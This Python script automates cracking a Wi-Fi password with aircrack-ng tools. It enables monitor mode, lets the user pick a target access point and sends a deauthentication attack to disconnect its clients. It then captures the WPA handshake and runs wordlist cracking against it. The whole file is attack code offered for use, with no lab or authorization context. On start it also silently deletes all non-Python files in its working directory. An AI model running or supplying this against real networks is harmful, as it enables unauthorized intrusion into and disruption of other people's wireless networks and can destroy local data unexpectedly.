#  sudo python3 wifi_crack.py   

import os
import time
import subprocess

interface = "wlan0"
fileName = "new"
pwd = os.getcwd()

wordlists = sorted([file for file in os.listdir(pwd + "/wordlist") if file.endswith('.txt')])


def start_monitor_mode(interface):
    print(f"Starting monitor mode on {interface}")
    os.system(f"sudo airmon-ng start {interface}")
    time.sleep(3)

def stop_monitor_mode(interface):
    print(f"Stopping monitor mode on {interface}")
    os.system(f"sudo airmon-ng stop {interface}mon")

def check_points(interface):
    os.system(f"sudo airodump-ng {interface}mon")

def capture_handshake(interface, bssid, channel):
    print(f"Capturing handshake for BSSID: {bssid} on channel {channel}")
    os.system(f"sudo airodump-ng --bssid {bssid} -c {channel} -w {fileName} {interface}mon")
    time.sleep(10)

def deauth_attack(interface, bssid):
    print(f"Launching deauth attack on BSSID: {bssid}")
    subprocess.Popen(f"sudo aireplay-ng --deauth 30 -a {bssid} {interface}mon", shell=True)

def crack_password(wordlist):
    print(f"\n \n \n **********************APPLYING {wordlist}\n \n \n ")
    os.system(f"sudo aircrack-ng -w {pwd+"/wordlist/"+wordlist} {fileName}-01.cap")

def delete_non_py_files(directory):
    # Loop through all files in the directory
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        # Check if it's a file and not a .py file
        if os.path.isfile(file_path) and not filename.endswith('.py') and filename != "wordlist":
            try:
                os.remove(file_path)  # Delete the file
                print(f"Deleted: {filename}")
            except Exception as e:
                print(f"Failed to delete {filename}: {e}")

def catch_packet(interface):
    start_monitor_mode(interface)
    check_points(interface)
    target_bssid = input("Enter BSSID: ")
    target_channel = input("Enter channel: ")
    deauth_attack(interface, target_bssid)
    capture_handshake(interface, target_bssid, target_channel)

def apply_wordlists():
    for fileName in wordlists:
        crack_password(fileName)

    input("\n \n \n \n \n Press enter to stop monitor mode.")
    stop_monitor_mode(interface)

if __name__ == "__main__":
    delete_non_py_files(pwd)
    catch_packet(interface)
    apply_wordlists()
